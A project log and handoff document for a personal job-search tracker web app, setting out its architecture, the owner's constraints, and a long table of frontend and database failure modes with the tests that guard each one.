# Web app build — living log and session handoff

**Read this first if you are picking up the web app work.** It is the
compaction anchor: it carries the decisions, the current state, and the
constraints that are easy to lose between context windows.

Companion docs: `docs/PRODUCT-SPEC.md` (what to build and the 26 acceptance
criteria), `db/migrations/0001_init.sql` + `0002_invariants.sql` (the store),
`db/README.md` (provisioning).

**Plans for every remaining phase live in `docs/plans/` — start at
`docs/plans/README.md`.** It carries the build order, the orphan list
(acceptance criteria and edge cases no plan owns — read this before planning
anything new), and the conflict list where independently-written plans made
incompatible assumptions. The single most important entry: `app_set_triage` is
called by `lib/data/supabase-source.ts` and **exists in no migration**, and four
separate plans each assume they are the one to create it. It must be built once,
first, before any of them.

---

## Goal for this phase

**Foundation → Triage → Export.** Those three make the app worth opening for
the owner and immediately useful to the other two users via export alone,
before the grid, pipeline, or import exist.

Then: plans/specs for the remaining phases, and a path to opening this up more
widely (public repo, invite + onboard strangers) — **researched, not
implemented**, unless there is a clean upgrade path from what exists.

## Hard constraints from the owner

1. **It must not visually break.** Stated fear, verbatim: *"Don't be mad when I
   come back and yell at you that the table looks off or is hanging off the
   edge of the page."* This is answered mechanically, not by promises — see
   Testing below.
2. **Pull from proven libraries.** Do not hand-roll a data grid, a focus trap,
   a dropdown, or an XLSX writer.
3. Standard, minimalist, scalable conventions — the reference points are
   Airtable, Linear, Superhuman, Stripe/Vercel consoles.
4. Non-technical users (his dad). Nothing may require debugging by the user.
5. Pause if 50% of weekly model usage is hit. *(Note: the assistant cannot
   query its own usage; flag rather than silently assume.)*

---

## Architecture decisions (and why)

### Data layer is injectable — this is the keystone

`lib/data/` exposes one interface with two implementations:

| Implementation | Used by | Why |
|---|---|---|
| Supabase-backed | production | the real store, RLS-enforced |
| Fixture-backed | tests, and a demo mode | hermetic, instant, deterministic |

Two things fall out of this, and both matter:

- **E2E tests need no database.** Playwright drives the real UI against
  deterministic data, so visual-regression snapshots are stable and CI needs
  no Supabase project.
- **The owner can see the app before provisioning anything.** Demo mode is a
  real preview, not a mockup. It is opt-in (`HQ_DEMO=1`) and never the default.

This mirrors `core/fakes.py` on the Python side, which is the pattern that has
already caught real bugs — including one where the fake was *too forgiving*
(it auto-grew a sheet grid that the real API refuses to grow). **A fake must
reproduce the real thing's failure modes, not just its happy path.**

### Writes never come from the browser

Every gesture is a server action calling one Postgres function that writes the
row *and* its audit event in one transaction. The browser holds the anon key
and has no insert/update policy (`0001_init.sql` ends by saying so; keep it
that way). Each gesture carries an idempotency key, and the `updated_at` it
read, so a double-tap is free and a second device gets a conflict rather than
a silent clobber.

---

## Frontend failure modes — the matrix

The owner's ask was **"figure out how to build it so it doesn't break in any of
the KNOWN failure ways."** Horizontal overflow was one hypothetical example,
not the requirement. This is the actual list, with what enforces each.

| # | Failure mode | Enforced by | Status |
|---|---|---|---|
| 1 | Page scrolls sideways | `layout.spec.ts` — 3 pages × 6 widths, names the offending element | ✅ |
| 2 | Hydration mismatch (silent; page still renders) | `resilience.spec.ts` asserts **zero console errors** per page | ✅ |
| 3 | Thrown component → **white screen** | `app/error.tsx` per route + `app/global-error.tsx` (self-contained, inline styles) | ✅ |
| 4 | Unreadable contrast | axe `wcag2a/wcag2aa` per page **per theme**. Caught a real one: muted text at 4.12:1 on 548 elements | ✅ |
| 5 | Keyboard trap / focus off-screen | Tab-walk asserts every focused element is visible and in-viewport | ✅ |
| 6 | Breaks at 200% text zoom | Doubles root font size, re-asserts no overflow | ✅ |
| 7 | Blank screen while loading | `loading.tsx` skeleton with the **same dimensions** as the real card (no layout shift) | ✅ |
| 8 | Failed write leaves a phantom row | Fixture `failNextWrite()` + revert-and-toast path | ✅ |
| 9 | Two devices → silent clobber | `expectedUpdatedAt` conflict path, modelled in the fake | ✅ |
| 10 | Double-tap applies twice | Idempotency key, replayed result | ✅ |
| 11 | Long content blows out layout | Fixtures carry a deliberately huge title + company | ✅ |
| 12 | Webfont fails / renders differently per machine | **No webfont.** System stack only | ✅ |
| 13 | Motion sickness | `prefers-reduced-motion` zeroes transitions | ✅ |
| 14 | Visual drift | `visual.spec.ts` — queue, jobs grid, and a selection, both themes × both viewports, as `-linux` baselines recorded and checked in the **same** Playwright container (the `visual` CI job). Verified stable on a second render, so it does not flake; the bare `webapp` job skips it so a font mismatch never turns that job red | ✅ |
| 15 | Empty states unrendered | `empty.spec.ts` — per-surface zero-row test in both viewports, seeded via `hq_demo_seed`; the queue distinguishes **filtered-out from nothing-found** and names the binding constraint; axe runs on the empty page | ✅ |
| 16 | Session expires mid-action | The action answers `kind: "auth"` rather than letting middleware redirect a POST; the gesture goes to the outbox and is delivered on the next page load after sign-in | ✅ |
| 17 | Offline / flaky network | `lib/outbox.ts` — the decision is kept, not reverted; banner, auto-replay on reconnect, safe because every gesture carries its idempotency key | ✅ |
| 18 | Perf collapse at 5k rows | Virtualization + a measured render budget — see rows 46–47 | ✅ |
| 19 | Back/forward + deep links | URL is the source of truth for the grid's set/filters/sort/search/group; `grid-url.spec.ts` — see rows 52, 57 | ✅ |
| 20 | Types drift from the DB | `types-contract.test.ts` parses `CREATE TABLE`/`ADD COLUMN` in the migrations and the row types in `lib/types.ts` and fails on any column-set, nullability, or scalar-kind divergence. Caught a real inversion: `string \| null` on a `NOT NULL` column. (The RPC-call contract is the Python `test_migrations.py`) | ✅ |
| 21 | **Keystroke before hydration is silently dropped** | Queue publishes `data-ready`; hints stay dim until the handler is attached; tests wait on the flag | ✅ |
| 22 | **Dark OS preference ignored entirely** | `theme.spec.ts` drives `colorScheme` and asserts the rendered background, not the class | ✅ |
| 23 | **Decorative text invisible on a non-default background** | `Kbd` inherits `currentColor` by construction — axe cannot catch this, the element is `aria-hidden` | ✅ |
| 24 | **Chrome pushes content below the fold on a phone** | Nav is a horizontal strip under `lg`; test asserts the first card sits in the top half of the viewport | ✅ |
| 25 | **Export silently ships a different set of rows than it promised** | The dialog states each scope's count from a fresh server read; `export.spec.ts` asserts the file's row count equals the stated one, and that the two scopes really differ | ✅ |
| 26 | **Excel treats the export as text** — dates unsortable, 100 sorting before 20 | `xlsx.test.ts` unzips the workbook and asserts real date serials *and* the number format actually applied through `styles.xml` | ✅ |
| 27 | **A zero-row export downloads a blank sheet with no header** | Sheet data is resolved explicitly so 0 rows behaves like N rows; asserted | ✅ |
| 28 | Malformed or oversized export request | Closed-set parser rejects instead of defaulting; key count is bounded | ✅ |
| 29 | Export hangs on a slow response | `AbortSignal.timeout`; the dialog stays open with the chosen scope intact and offers retry | ✅ |
| 30 | Decorative text fails contrast because of an opacity multiplier | `Kbd` carries no opacity; it is exactly as legible as the text it sits in. Caught by axe on the Export button | ✅ |
| 31 | **The store exists once per server bundle, so acknowledged writes vanish** | Demo store hung off `globalThis`; `persistence.spec.ts` reloads after a decision, checks it reached `/pipeline`, and cross-checks the export's row count against the screen | ✅ |
| 32 | **Undo restores the pre-write row, so the card conflicts forever** | The undo and conflict paths re-insert the row the SERVER returned, never the captured one; `persistence.spec.ts` runs triage → undo → decide again | ✅ |
| 33 | **A failed or offline Undo is silently swallowed** | The undo branches on its `WriteResult` and falls back to the outbox instead of a bare `.then()` | ✅ |
| 34 | **Triage hotkeys fire behind an open modal** | The window handler ignores keys while a Radix dialog is open | ✅ |
| 35 | **Snooze stores the UTC day, not the local one** (AC 14) | `lib/dates.ts` + `dates.test.ts` against a pinned clock *and* a pinned timezone, incl. a DST boundary | ✅ |
| 36 | **A missing env var serves fixtures as real data, with no auth gate** | Fixtures require explicit `HQ_DEMO`; middleware sends an unconfigured deployment to `/setup`; `getDataSource` throws rather than guessing | ✅ |
| 37 | **An expired session on export dead-ends on "the server returned 405"** | The route answers 401 itself; middleware redirecting a POST sends `fetch` to `POST /login`, which 405s | ✅ |
| 38 | Server action accepts any payload the client sends | Closed-set validation at the boundary — a server action is a public endpoint and `TriageInput` is erased at runtime | ✅ |
| 39 | **The RPC the app calls exists in no migration** | `0003_write_path.sql`, plus `tests/core/test_migrations.py` parsing every `supabase.rpc()` call against the SQL | ✅ |
| 40 | **Migration logic has never been executed** | CI job `db` applies the schema to a real Postgres and runs the write path (AC 9, 10, 11, 26) | ✅ |
| 41 | **A dismissed posting keeps a live `Queued` application forever** | Any move off `interested` removes the still-`Queued` application it created, in `app_set_triage` *and* the fixture; a bot-advanced one still survives | ✅ |
| 42 | **The RLS test the spec mandates cannot be written** | `test-harness.sql` grants what Supabase grants, so `set role authenticated` reaches the tables; `test_rls.py` asserts BOTH directions, plus a meta-test that disabling RLS turns it red | ✅ |
| 43 | **An authenticated session can `TRUNCATE` the audit trail** | `0004_audit_hardening.sql` revokes truncate/trigger/references, incl. default privileges for future tables | ✅ |
| 44 | **Undo after the background flush already delivered the gesture** | The deferred Undo branches on `dequeue()`'s answer and sends a real compensating write against the delivered `updatedAt`; `undo-delivery.spec.ts` asserts it *after a reload*, which is the only place the lie was visible | ✅ |
| 45 | A test races the thing it is asserting, and fails about half the time in CI | Every read of the export dialog's count waits for it, and the offline-reload test keeps the server action unreachable instead of going online and racing its own mount-flush. Both flakes were the test disagreeing with itself, not the app misbehaving — and a flake reads as a real failure, which is worse than a slow test | ✅ |
| 46 | **Virtualization silently switches off** — 5k rows land in the DOM | `grid-perf.spec.ts`: at `?perf=5000`, rendered `[role=row]` count is >10 **and** ≤80 at top/middle/bottom. The lower bound matters — an empty grid would satisfy an upper bound alone. Verified red with virtualization removed | ✅ |
| 47 | **Perf collapse at 5k rows** (was row 18) | Same spec under 4× CPU throttle: client TTI < 6s from `responseEnd` (measured 744ms), zero long tasks > 200ms across a 30-viewport scroll. Verified red | ✅ |
| 48 | **Sticky header/first column drifts under diagonal scroll** | Header y and company x pinned within 1px after scrolling (240, 4000); header and body column edges agree. Rows are positioned with `top`, never `translateY` — a transform makes the row a containing block and silently kills the sticky cell | ✅ |
| 49 | **The grid overflows the PAGE instead of its own container** | `/jobs` added to `layout.spec.ts`'s painted-geometry sweep, plus a 280px container-scrollability check. Verified red by switching the container to `overflow-visible` | ✅ |
| 50 | **The grid silently shows a subset** | It states its counts ("8 of 19 postings"), and the test asserts exact set membership rather than a total — so "8 of 8" cannot pass | ✅ |
| 51 | **A `Closed` posting is offered as decidable work** (criterion 16) | The rule lived only in `SupabaseDataSource.queue()`'s SQL; `JobView.status` now carries it and both sources enforce it. `FIXTURE_JOBS` contains a Closed row that is otherwise perfectly qualified, so the assertion can fail | ✅ |
| 52 | **Two demo visitors share one queue and drain each other's cards** | `get-source.ts` keyed stores by `hq_demo_id` and promised each browser its own, but nothing issued the cookie; middleware now mints it on first visit. `demo-isolation.spec.ts` uses fresh contexts (not the cookie-setting `beforeEach`) and asserts one visitor's triage does not move another's queue | ✅ |
| 53 | **Back/forward loses filters; a deep link renders a different grid** (row 19, criterion 22) | `grid-url.spec.ts`: 2 filters + sort via UI → leave → Back → same URL, rows, count; one decision per Back step; a fresh `goto(fullUrl)` is identical. Verified red with `push` swapped to `replace` | ✅ |
| 54 | URL round-trip drops or reorders a filter clause | `url-state.test.ts`: `parse(serialize(s)) === s`, every op × field type, values containing `.` `,` `\|` `%` and unicode. Verified red by removing comma-escaping | ✅ |
| 55 | A malformed URL param crashes the page or is silently "repaired" | Clause-granular drop + one toast; valid siblings in the same `f=` still apply; bogus `sort`/`group` half-apply nothing | ✅ |
| 56 | **Comp filter silently drops unstated/unparseable comp** (G16) | Keep keyed on `compMaxK`, so "£90k" (stated but unparsed) survives; chip states "incl. N unstated"; exclusion is an explicit visible clause. Verified red by removing the keep-rule | ✅ |
| 57 | **Nulls sort as 0** — no-comp rows crown "comp desc" (was row 35) | Pure `sortRows`, unknowns last in BOTH directions (react-table's `desc` inverts the comparator and would send nulls first); unit + full-row-order e2e across the asc/desc/off cycle | ✅ |
| 58 | Deep link pops after hydration (server renders unfiltered, client snaps) | `grid-url.spec.ts` asserts the RAW response HTML already carries the filtered count and sorted order | ✅ |
| 59 | Back steps through keystrokes; a pending search flush resurrects a cleared query | Debounced `replace` onto one history entry + an explicit flush-cancel in Clear — the resurrection was a real bug the test caught pre-ship | ✅ |
| 60 | A zero-result filter strands the user in a blank grid | No-match empty state distinct from the profile-gated copy; one-click Clear restores. (The G9 constraint-*naming* for user filters is G3) | ✅ |
| 61 | **Dark OS preference ignored on a route theme.spec never checked** | `theme.spec.ts` now drives every landing route — `/queue`, `/jobs`, `/pipeline`, `/health` — and asserts the rendered dark background, not just the class. `/jobs` (a shareable deep link) had no such guard | ✅ |
| 62 | **A saved view "saves" but a reload renders the preset** — state stored where nothing re-reads it | `grid-views.spec.ts` asserts the saved view's rows/name **after `page.reload()`** and in the raw HTML; verified red with `?view=` resolution nulled | ✅ |
| 63 | Save as… silently overwrites an existing view name | Collision answered with the store's message in-dialog, nothing navigates; verified red with the rejection swallowed | ✅ |
| 64 | Two devices editing one view → silent clobber | A display-only stale edit → Save shows "changed on another device"; reload shows the other device's state. The fixture models the conflict, the db test proves the SQL (`test_saved_views.py`) | ✅ |
| 65 | **A landing default hijacks bare `/jobs` forever** — plain Queue unreachable | `presetUrl` always emits an explicit `set=`; unit + e2e (Queue reachable after a landing view is set) | ✅ |
| 66 | Why-popover names the wrong setting or links to a dead anchor | e2e clicks through to `/settings#countries` and asserts the section exists; verified red with the anchor hardcoded wrong | ✅ |
| 67 | Display prefs (density/type/hints) leak into the URL or die on reload | Kept out of the URL (a shared link must not impose the sharer's eyesight), stored in the view's `state`; asserted after Save + reload; verified red with display dropped from stored state | ✅ |
| 68 | A deleted or foreign `view=` id 404s or renders a blank grid | Stale-id e2e: a loud toast + the Queue rows, never a dead end | ✅ |
| 69 | Typing a view name or search fires grid shortcuts (the old ◐ row) | `j`/`?` typed into inputs: no popover, text lands in the field. Now falsifiable because the grid has a `?` shortcut | ✅ |
| 70 | Density switch mid-scroll strands the viewport | perf-1000 e2e: the first-visible index is preserved ±2 and the viewport centre stays painted rows | ✅ |
| 71 | **A phone user has no on-screen way to leave the Queue** | The view switcher was desktop-only and a standalone Queue/All toggle was the phone's set control; removing the toggle as a duplicate made the switcher the single control and showed it on every viewport. `grid-views.spec.ts` drives the switcher on the mobile project | ✅ |
| 72 | **Export/copy scope includes rows the filter has hidden** | Two independent layers — `pruneSelection` permanently drops hidden keys on filter change, and `selectedRows` order-intersects against the visible leaves. `grid-selection.spec.ts` selects 3, filters to hide 2, asserts the bar/⌘C/export all say 1 and the file byte-matches. Verified red only with BOTH layers broken | ✅ |
| 73 | Shift-click range wrong across sort/group, or a group header gets selected | Selection spans `displayLeaves` order (headers are not in it, so unselectable by construction); the anchor is a key, so re-sorting cannot shift the span. Verified red with the anchor lookup broken | ✅ |
| 74 | ⌘C / export carries hidden columns or the wrong column order | `exportColumnsFor` maps visible columns through `JOB_COLUMNS` in view order (+ the URL, stated in the menu); clipboard TSV and downloaded CSV are byte-asserted. Verified red returning all 16 columns | ✅ |
| 75 | The export menu states one count and the file contains another (H22) | Counts and payloads derive from the same arrays in the same render; the e2e byte-compares the CSV against the stated count under an active filter | ✅ |
| 76 | **Bulk triage half-applies** — N writes instead of one transaction | One `setTriageBulkAction` → `app_set_triage_bulk` (atomic; the fixture models the same all-or-nothing, `test_bulk_triage.py` proves the SQL). A staged conflict reverts every optimistic row. Verified red twice: conflict-revert skipped, and only 1 of 3 keys sent | ✅ |
| 77 | A bulk undo restores only part of the batch | One Undo replays the inverse batch (partitioned by prior value) with fresh idempotency keys against the delivered `updatedAt`. Verified red undoing only the first row | ✅ |
| 78 | Typing in quick search bulk-triages the selection | The queue's `INPUT\|TEXTAREA\|SELECT` guard covers `i`/`x`/`s`/Space/⌘C; the e2e types into search with a selection held — no toast, text lands in the field | ✅ |
| 79 | The selection bar clips off-screen or shifts the grid | `position: fixed` to the viewport — the `h-dvh` wrapper's bottom starts below the fold on phones, which clipped the Clear row (found by the screenshot pass, not any assertion). Row geometry unchanged when the bar appears; painted-overflow clean at 280px with a selection | ✅ |
| 80 | **Selected rows are indistinguishable in dark mode** | A dedicated `--selected` token (not `accent-subtle`, which sits a hair off the dark background); tuned to stand off both the base and the hover in each theme. Found by looking at it, not by a test | ✅ |
| 81 | **The Comp column ellipsizes its own band at large type** | Column widths scale with the type ratio (18/14), applied identically to header and body so their edges stay aligned; `grid-polish.spec.ts` measures every comp cell for clip at large type | ✅ |
| 82 | **A selected row's muted text fails AA contrast on the tint** | On a selected row muted text is promoted to `text-2`; a tint strong enough to read as selection is too dark for `#707067` at AA (3.97:1). Caught by `grid-polish.spec.ts`'s axe-with-selection scan the first time it ran — the at-rest sweep in `resilience.spec.ts` never selects | ✅ |
| 83 | **A reliability tier is rendered as if it were measured** | The whole reason `/companies` exists as its own surface. Two rows can both read "Tier 1 · day-of" while one had a Greenhouse API answer and the other is an unprobed Common Crawl slug from a corpus the research pass found "contains dead boards". `resolutionConfidence()` derives verified / inferred / asserted / unresolved from `resolution_method`, the chip always carries the word beside the tier, and the coverage meter's HEADLINE is the verified count with the tier-1 total shown separately as the softer number. **Fails closed:** an unrecognised method is never "verified", and a tiered row with an unreadable method is kept out of every tier bucket. `company-resolution.test.ts` + `coverage.test.ts` + an e2e that asserts the two Tier-1 rows are distinguishable on screen | ✅ |
| 84 | **A coverage meter implies recall it cannot compute** | `monitor/oracle.py` is the only thing that can size a facet's universe; it is a keyed Python job and nothing writes its result where the web app reads. `ORACLE_UNMEASURED` is an explicitly-empty slot and the meter says "Recall: not measured" in words — omitting the row would let a reader take "84% verified" as recall, which is the misreading the design fears. The e2e asserts the slot contains no `%` at all | ✅ |
| 85 | **A pasted company name claims a reliability tier nobody earned** | Nothing reachable from the web app probes an ATS (the waterfall is `monitor/discover.py`, in Python). `app_propose_companies` writes tier 3 / `manual`, the API route refuses to accept an `ats`/`slug`/`tier` from its caller, and a paste never demotes a company the resolver already grounded. Pinned in SQL (`test_company_review.py`), in the fake (`parity.test.ts`, against the migration's own text), and end-to-end | ✅ |
| 86 | **An unreviewed company gets swept behind the user's back** | The review gate is enforced in SQL, not only in the UI: `app_set_company_flags` raises on a row whose `review_state <> 'approved'`, and approving is what turns `monitor` on. Watched go red with the gate removed | ✅ |
| 87 | **A bulk review half-applies** | One `setCompanyReviewAction` → `app_set_company_review_bulk` (atomic; the fixture models the same all-or-nothing, `test_company_review.py` proves the SQL by staging a conflict on the LAST row and asserting the FIRST was not left written). A conflict reverts every optimistic row and restores the selection | ✅ |
| 88 | **A keyboard write-verb fires on a selection the user already cleared** | The parent read the selection out of the `bulkBar` render prop — which is only called while something is selected, so a Clear left it holding the last non-empty set and the next `a` would have decided invisible rows. `onSelectionChange` fires on the empty selection too; the e2e presses `j` then `a` with nothing selected and asserts the row count is unchanged | ✅ |
| 89 | **A pasted list is mis-split into companies that do not exist** | `parsePastedNames` is shared by the preview, the server action and the API route, so what is shown is byte-identical to what is written — and the add form previews the parse BEFORE submitting, which is how a guess becomes something a person can correct. Found by looking at that preview: `- 1. McDonald's` came through as `1. McDonald's` because the marker strip ran once and markers combine. Now one regex with a repeat group, and `paste.test.ts` covers CSV cells, comma-joined sentences, CRLF, bullets, `3M`, and a line of pure markers | ✅ |
| 90 | **The `/companies` skeleton drops the grid 8px when data lands** | The coverage band sits BETWEEN the toolbar and the grid, and its headline row is `h-6` (the toggle button sets the height), not `h-4`. Measured, not assumed: `companies.spec.ts` compares the skeleton's column rail against the loaded one on desktop, and separately asserts the skeleton carries all four bands at any viewport. The first version was 8px short and the test said so | ✅ |
| 91 | **Two Playwright projects share one demo store and assert on each other's leftovers** | Desktop and mobile run the same specs against the same server process, so a bare `hq_demo_id` put both runs in one store: whichever ran second found the pasted companies already added. The id now carries the project name. Three "mobile" failures that said nothing about the mobile viewport | ✅ |
| 92 | **A drift guard cannot see the columns it is supposed to guard** | `types-contract.test.ts` parsed `alter table … add column a, add column b;` and registered only the first column, then swallowed the rest into its default clause — so `companies.resolution_method` and `user_companies.updated_at` were invisible to it. Adding those two tables to the contract exposed it; the parser now splits the statement on top-level commas. Verified red by deleting one field from `UserCompany` | ✅ |
| 93 | **A pasted name creates a permanent ghost beside the company it names** | `app_propose_companies` inserted on `(name, '', '')`, and the resolver only ever writes rows with a non-empty ats+slug — so a paste of an already-grounded name collided with nothing: a second tier-3 row, and the human's subscription bound to it. A company that reads as watched and is never pulled from. The lookup is now `company_name_key(name)` across every row, grounded first, plus a PARTIAL unique index on the normalized name for the race a lookup cannot cover. Fixes the two cross-paste duplicates in the same stroke ('Aon'/'aon', and the trailing NBSP `btrim()` does not strip). Watched go red with the raw key restored, in the SQL and in the fake | ✅ |
| 94 | **A bare insert lands a swept-but-unreviewed row** | `monitor` defaults to TRUE (0001), so any writer inserting a proposal without naming it fails OPEN on the one flag whose whole purpose is that a human said yes first. `app_set_company_flags` guarded the UI's door only; `check (monitor = false or review_state = 'approved')` guards every other one | ✅ |
| 95 | **Two tabs reviewing one selection in different sort orders deadlock** | The grid sends ids in DISPLAY order, so a name-sorted tab and a tier-sorted tab hand `app_set_company_review_bulk` the same selection in opposite sequences and each holds the row the other wants next — 40P01, surfaced to the user as a generic failure for a perfectly valid gesture. Every id is now locked in ascending order before any write. The db test runs both directions concurrently over 40 rows: wide enough that the unordered version fails on the first round, and the ordered one cannot fail at all | ✅ |
| 96 | **A non-RPC writer freezes the version token** | `user_companies` was the only versioned table without `touch_updated_at`. The three RPCs set `updated_at` themselves, so the column looked fine; a backfill, a psql fix or a future bot changed the row and left the token where it was, and the next client holding the old value passed its conflict check and clobbered a write it never saw | ✅ |
| 97 | **A live write endpoint with no caller** | `app_set_company_flags` + `setCompanyFlagsAction` existed, were granted to `authenticated`, and nothing in the app reached them — so row 86 guarded an unreachable path while a security-definer door sat unwatched. `sweep-toggle.tsx` is the one honest caller: a single flag, approved rows only (the SQL refuses the rest, and a switch that always errors is worse than none), optimistic against the row's token, the server's row on conflict. E2E across a reload, absent on unreviewed rows, reverting on a failed write | ✅ |
| 98 | **An open prefix launders an unknown method into "verified"** | `resolutionConfidence` matched `startsWith("discover-")`, so any future `discover-<anything>` — a new adapter, a typo, a hand-edited row — counted as a first-party board call nobody made. The exact false confidence the fail-closed default exists to prevent, arriving through the one branch that skipped it. Verified is now the five strings `monitor/discover.py` can emit; an unknown `discover-*` is `inferred`. `explainResolution` names the API from the ROW's `ats`, so a mismatched pair cannot print a confident sentence about a board the company does not have | ✅ |
| 99 | **A capability this table counts has no way to be exercised** | `FixtureDataSource.failNextWrite()` — the mechanism behind rows 8 and 9 — had ZERO CALLERS. That is the shape the adversarial sweep already named once, grown back. `hq_demo_fail` is the channel a browser-driven test needs, mirroring `hq_demo_session=expired`; `/companies` now proves a rejected batch reverts every optimistic row and that the store holds none of it after a reload. Arming it needed a duck-typed check rather than `instanceof`: the store is constructed in one server bundle and read in another, so the class objects differ — the three-stores bug, one layer down, found by watching the new test fail | ✅ |
| 100 | **The confirmation toast covers the button that produced it** | On a phone `/companies/add` is almost exactly one screen. Typing a second list re-opens the preview, which pushes "Add N companies" from y=689 to y=773 — into the 749–823 strip the previous paste's toast occupies — and with the document exactly viewport-height there is nowhere to scroll it clear. Waiting does not reliably help either: sonner pauses its 8s dismiss timer while a finger (or Playwright's cursor) rests on the toaster, so the click retried for its full 30s. A `pb-40` safe area below the form means the page always scrolls far enough to lift the action out of the strip; `closeButton` on the Toaster is the second way out. The e2e scrolls to the end and hit-tests the button's own centre — verified red with the safe area removed. **Not claimed:** that a bottom-anchored toast never overlaps anything; reserving the strip app-wide is a bigger change and the /jobs selection bar has the same shape | ✅ |
| 101 | **A pixel assertion runs where the fonts are not pinned** | The `/companies` skeleton-rail measurement lived in `companies.spec.ts`, so it ran on the bare `webapp` runner: skeleton 185, loaded 221, while macOS *and* the Playwright container both measure 0. Nothing was wrong with the skeleton — the loaded page is 36px taller above the rail on that runner's fonts, because the header subtitle and the coverage headline wrap where they do not wrap elsewhere, and a skeleton of fixed-height blocks cannot track a line-box count. It moved to `visual.spec.ts`, which is this repo's existing answer to exactly this ("a check that fails for a font mismatch is the permanently-red check the matrix is careful never to ship"). Plain e2e keeps band count + ordering + rail-below-coverage, which is font-independent and is the half that caught the real bug (row 90). Widening to 40px was rejected: at 40 the assertion can no longer tell a correct skeleton from one missing its coverage band | ✅ |
| 102 | **A bot overwrites a status a human chose** (AC 14 — was a LIVE defect) | `status_rank("Rejected")` is 9 and `status_rank("Offer")` is 7, so a rejection classified at 0.99 was a legal forward move over an Offer a person had set. Rank protects an INVENTED status and protected nothing canonical somebody picked on purpose. Fixed for the DATABASE writers: `applications.status_actor` + a BEFORE UPDATE trigger (0010) covers the app and the engine's service-role writes, and the trigger now defends its own latch (`status_actor` was unguarded, so `set status_actor='system'` was a one-statement unlock). **Not fixed for the sheet, and the earlier wording claimed otherwise.** `Tab.advance_status` honours a `status_actor` cell that reads `user`, but nothing SETS it when a human types a status into the Pipeline tab — so on the sheet a 0.99 rejection still overwrites a hand-typed Offer unless the person also picks `user` from the `status_actor` dropdown. The webapp path is the lock's real writer; the sheet has a manual latch and a documented gap (see the deferral list). Closing it needs a capture-side or Apps-Script mechanism that is out of P8's scope. The obvious trigger — "allow it when the write also sets `status_actor='user'`" — is a GUARANTEE of the bug: an UPDATE that does not mention a column carries the OLD value into `new`, so on an already-locked row every bot write arrives with `new.status_actor='user'` for free, and the one row the guard exists to protect was the one it waved through. A row trigger cannot see the SET list, so the declaration is an explicit transaction-local `hq.status_write` flag, set and cleared around each statement. Watched red; the naive version and flag-leakage are both pinned | ✅ |
| 103 | **`advance_status` swallows the bot's opinion on a locked row** | AC 14 has two halves — the human keeps their Offer AND sees that a rejection arrived. `locked` is a THIRD outcome, not a second flavour of `kept`: a rank-`kept` move is a stale email and "suggests Applied" on an Interview row is noise, while a `locked` one is a real opinion about a row the bot may not write. `tracker/join.py` writes `suggested_status` + evidence on `locked` and activity only on `kept` | ✅ |
| 104 | **`STATUS_RESOLVED` reachable by a bot** | `Offer-Accepted` ends somebody's search, and the classifier must never do it. Structural rather than remembered: a bot writes only what `EVENT_STATUS_RULES` names, `_apply_rules` asserts the target is not in `STATUS_RESOLVED`, and `test_sheets.py` asserts the two sets stay disjoint — because that table is hand-edited and adding an `offer_accepted` event type would otherwise be enough | ✅ |
| 105 | **The status list drifts from `core/schema.py`** | `webapp/lib/status.ts` is the ONE webapp copy (it existed three times: two hand-typed and the Python authority). `status.test.ts` PARSES `core/schema.py` and compares every list and every rank across the whole vocabulary plus invented and blank values — a comment saying "keep in step" is not a mechanism | ✅ |
| 106 | **Confirming a suggestion twice applies twice** | `command_idempotency` stores the RESULT, so a replay returns the first answer; asserted in `tests/db/test_pipeline.py` (same key, different intent → one event) and over the fake | ✅ |
| 107 | **Rejecting a suggestion also changes the status** | Two layers, because the second was invisible. SQL: the reject branch's UPDATE touches `suggested_status` alone, pinned structurally in `parity.test.ts` (no `v_suggested`, no `status_actor`, no human-write flag inside that branch) and behaviourally against real Postgres. Client: the OPTIMISTIC frame is pinned in `optimistic.test.ts` by KEY SET — a mutant that applied the declined status optimistically passed all 46 pipeline E2E tests in both projects, because the demo store answers faster than a retrying `expect` can look | ✅ |
| 108 | **A note lost because the flat column was overwritten** | `application_notes` is append-only, and that is a GRANT not a convention: `revoke insert, update, delete, truncate … from anon, authenticated`, asserted under `set role authenticated` (both statements refused, note #1 verbatim afterwards). Verified red with the revoke removed | ✅ |
| 109 | **The notes backfill blanks a column every export ships** | 0010 copies `applications.notes` into the entity and NEVER clears it — spec §E round-trips that column and `APPLICATION_COLUMNS` reads it. `exportNote()` prefers the newest note and falls back to the column, which is correct in all three states a row can be in (pre-migration, backfilled, written-since), and `notes.test.ts` asserts the exported bytes as a before/after PAIR plus the unchanged header order. The backfill is idempotent, and the test re-executes the migration's own statement rather than a paraphrase | ✅ |
| 110 | **A blank note reaches an append-only table** | SQL's bare `btrim(x)` trims SPACES ONLY, so `btrim(E'\n\t')` is not `''` and a note of one newline passed every emptiness check into a table with no delete. `hq_blank_trim` handles tabs, newlines and the unicode separators (0008's NBSP lesson), the table CHECK uses it too, and `blankTrim` mirrors it with the character classes spelled out on both sides. Found by RUNNING the migration; the reader that "looked right" is quoted in its comment | ✅ |
| 111 | **A reopen leaves no trace of why** | Enforced in SQL, not in the dialog: `app_set_status` refuses a terminal→live move with an empty body, so the rule holds for a replayed outbox gesture and any other caller. The UI asks for the reason before sending rather than red-toasting afterwards, and the note lands in the history | ✅ |
| 112 | **Second device silently clobbers a status** | `expectedUpdatedAt` → `conflict:` (the word `supabase-source.ts` matches on), proved against real Postgres by two overlapping connections: one succeeds, one 409s, exactly ONE event — the loser writes nothing, not even an audit row | ✅ |
| 113 | **The conflict toast fires but the stale value stays on screen** | The distinct half of row 112, and the one that bites: a toast saying "showing the latest" beside the value that lost is worse than silence. Every write settles on the row the SERVER returned (`result.current` on conflict), and `?demo=conflict:N` drives it end-to-end — asserting the refreshed value AND that exactly one status pill remains. The seam applies its edit AFTER the page's read, which is the whole mechanism: applying it first hands the client the new token and there is nothing left to conflict with | ✅ |
| 114 | **A failed write leaves the new status on screen** | `?demo=failnext` arms `failNextWrite` through the same duck-typed channel `hq_demo_fail` uses, and the e2e asserts revert → Retry → success → survives a reload. This is the first thing on this surface to exercise that mechanism | ✅ |
| 115 | **A gesture arriving mid-write is silently DROPPED** | The first version bailed on `busyId !== null`. The next-action fields commit on blur, so typing text and tabbing to the date makes two writes milliseconds apart and the second vanished — green on desktop, red on the phone project, on the one path whose job is not losing what somebody typed. Writes are serialized, and each reads its version token when its TURN comes, so a chained write cannot conflict against its own predecessor | ✅ |
| 116 | **A blur-committed field clears itself under the user** | Both next-action inputs shared one `useEffect`, so the text write landing re-seeded the DATE from a server row that did not have it yet. One effect per field; the date's does not run when only the text changed | ✅ |
